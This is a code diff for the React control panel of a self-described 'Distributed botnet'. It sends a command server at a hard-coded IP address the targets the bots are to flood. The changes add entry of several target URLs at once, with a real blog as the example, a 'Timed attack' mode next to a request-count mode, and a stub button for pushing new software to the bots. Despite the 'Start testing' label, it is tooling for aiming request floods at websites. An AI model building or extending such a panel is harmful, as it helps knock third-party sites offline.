@@ -1,4 +1,4 @@
-import React, { useState, useEffect, useReducer, useLayoutEffect } from "react";
+import React, { useState, useEffect, useRef } from "react";
 import { useNavigate } from "react-router-dom";
 import axios from "axios";
 import {
@@ -8,7 +8,6 @@ import {
   YAxis,
   CartesianGrid,
   Tooltip,
-  Legend,
   ResponsiveContainer,
 } from "recharts";
 import {
@@ -19,8 +18,8 @@ import {
   Button,
   Input,
   Code,
-  IconButton,
-  Icon,
+  Textarea,
+  Radio,
 } from "@vechaiui/react";
 
 const Panel = () => {
@@ -29,6 +28,8 @@ const Panel = () => {
   const serverUrl = "http://54.211.202.150:5000";
 
   const [time, setTime] = useState(0);
+  const [type, setType] = useState(1);
+  const [inputValue, setInputValue] = useState(0);
   const [requestsNum, setRequestsNum] = useState(100);
   const [active, setActive] = useState(false);
   const [running, setRunning] = useState(false);
@@ -166,7 +167,6 @@ const Panel = () => {
     target: string
   ) => {
     setRunning(true);
-    setTime(0);
     setRequestsNumber(requestsNum);
     setResponses([]);
     changeServerStatus(serverUrl, true);
@@ -176,6 +176,7 @@ const Panel = () => {
 
   const stopBotnet = (serverUrl: string) => {
     changeServerStatus(serverUrl, false);
+    setTime(0);
     setRunning(false);
     setActiveBots([]);
     setBotsStats([]);
@@ -184,8 +185,11 @@ const Panel = () => {
   useEffect(() => {
     if (running) {
       intervalTimer = setInterval(() => {
-        setTime((prevTime) => prevTime + 10);
+        type === 1
+          ? setTime((prevTime) => prevTime + 10)
+          : setTime((prevTime) => prevTime - 10);
       }, 10);
+
       intervalActivity = setInterval(() => {
         getActiveBots(serverUrl);
         getBotsStats(serverUrl, responses);
@@ -200,6 +204,17 @@ const Panel = () => {
       clearInterval(intervalActivity);
     };
   }, [running]);
+
+  useEffect(() => {
+    if (time <= 0) {
+      setRunning(false);
+      stopBotnet(serverUrl);
+    }
+  }, [time]);
+
+  useEffect(() => {
+    type === 1 ? setRequestsNum(inputValue) : setTime(inputValue * 1000);
+  }, [inputValue]);
 
   useEffect(() => {
     if (!localStorage.getItem("password")) {
@@ -219,7 +234,7 @@ const Panel = () => {
             <h1 className="text-3xl font-bold text-gray-700">
               Distributed botnet
             </h1>
-            <p className="text-gray-400 mb-8">version 1.0.3</p>
+            <p className="text-gray-400 mb-8">version 2.0.0</p>
           </div>
           <Button className="mt-2" onClick={logout}>
             Exit
@@ -228,30 +243,62 @@ const Panel = () => {
         <div style={{ height: "75vh" }} className="w-full flex">
           <div className="flex flex-col w-1/2">
             <div style={{ height: "40%" }} className="mb-5">
-              <p className="text-gray-500 text-base mb-3">Give the target:</p>
+              <p className="text-gray-500 text-base mb-3">
+                Give the targets (separate with space):
+              </p>
               <div className="w-5/6">
-                <Input.Group>
-                  <Input.LeftAddon children="https://" />
-                  <Input
-                    placeholder="target"
-                    onChange={(e) => {
-                      setTarget(e.target.value);
-                    }}
-                  />
-                </Input.Group>
+                <Textarea
+                  onChange={(e) => {
+                    setTarget(e.target.value);
+                  }}
+                  placeholder="http://indrekis2.blogspot.com/"
+                />
               </div>
-              <div className="flex gap-5 mt-5 mb-3 w-5/6 ">
+              <div className="flex items-center gap-5 w-5/6 mt-3 ">
+                <p className="text-sm font-bold text-gray-800  mr-2">
+                  Choose mode:
+                </p>
+                <Radio
+                  name="basic"
+                  defaultChecked
+                  onChange={() => {
+                    console.log("Amount");
+                    setType(1);
+                    setTime(0);
+                    setRequestsNum(inputValue);
+                  }}
+                >
+                  Requests amount
+                </Radio>
+                <Radio
+                  name="basic"
+                  onChange={() => {
+                    setType(2);
+                    setRequestsNum(0);
+                    setTime(inputValue * 1000);
+                  }}
+                >
+                  Timed attack
+                </Radio>
+              </div>
+              <div className="flex gap-5 mt-3 mb-3 items-center ">
                 <FormControl id="email" className=" flex flex-col ">
-                  <FormLabel>Amount of requests</FormLabel>
+                  <FormLabel>
+                    {type == 1 ? "Requests amount" : "Amount of time (sec)"}
+                  </FormLabel>
                   <Input
                     placeholder="100"
                     onChange={(e) => {
-                      setRequestsNum(parseInt(e.target.value));
+                      setInputValue(
+                        isNaN(parseInt(e.target.value))
+                          ? 0
+                          : parseInt(e.target.value)
+                      );
                     }}
                     required
                   />
                 </FormControl>
-                <FormControl className="flex flex-col">
+                <FormControl className="flex flex-col ">
                   <FormLabel htmlFor="server-active" className="mb-0 mr-2">
                     Set server active
                   </FormLabel>
@@ -262,11 +309,9 @@ const Panel = () => {
                     onChange={() => changeServerStatus(serverUrl, !active)}
                   />
                 </FormControl>
-              </div>
-              <div className="w-5/6 flex gap-2 justify-end">
                 <Button
                   onClick={() => {
-                    changeTarget(serverUrl, "https://" + target);
+                    changeTarget(serverUrl, target);
                   }}
                 >
                   Change target
@@ -277,6 +322,7 @@ const Panel = () => {
                   }}
                   variant="solid"
                   color="primary"
+                  disabled={running}
                 >
                   Start testing
                 </Button>
@@ -306,9 +352,19 @@ const Panel = () => {
           </div>
           <div className="flex-col w-1/2">
             <div className="h-1/3">
-              <div className="flex items-center mb-3 gap-2">
-                <p className="text-gray-500 text-base">Connected bots</p>
-                <Badge>{activeBots.length}</Badge>
+              <div className="flex justify-between items-center mb-3">
+                <div className="flex items-center gap-2">
+                  <p className="text-gray-500 text-base">Connected bots</p>
+                  <Badge>{activeBots.length}</Badge>
+                </div>
+                <Button
+                  onClick={() => {
+                    alert("Update sw");
+                  }}
+                  disabled={running}
+                >
+                  Upload bot software
+                </Button>
               </div>
               <div>
                 {activeBots.length != 0 ? (
